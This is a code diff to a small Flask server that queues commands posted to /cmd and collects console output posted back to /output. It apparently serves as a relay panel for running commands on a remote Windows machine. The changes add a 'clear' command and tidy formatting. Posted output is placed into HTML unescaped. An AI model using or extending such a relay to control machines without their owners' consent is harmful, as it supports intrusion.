@@ -1,6 +1,5 @@
 from flask import Flask, request
 
-
 app = Flask(__name__)
 command = ""
 out = ""
@@ -12,7 +11,10 @@ def cmd():
     global out
     if request.method == 'POST':
         command = request.form['command']
-        out += command + '<br/>'
+        if command == 'clear':
+            out = ''
+        else:
+            out = out + command + '<br/>'
     return command
 
 
@@ -22,16 +24,17 @@ def output():
     if request.method == 'POST':
         req = request.form['out'].encode('cp1251').decode('cp866')
         req = req.replace("\n", "<br/>")
-        out += req + '\n' + '-' * 600
+        if req != '':
+            out = out + req + '<br/>' + '-' * 600 + '<br/>'
     return out
 
 
 @app.route("/clear", methods=['GET'])
 def clear():
     global command
-    command = ""
+    command = ''
     return "Command cleared"
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     app.run()
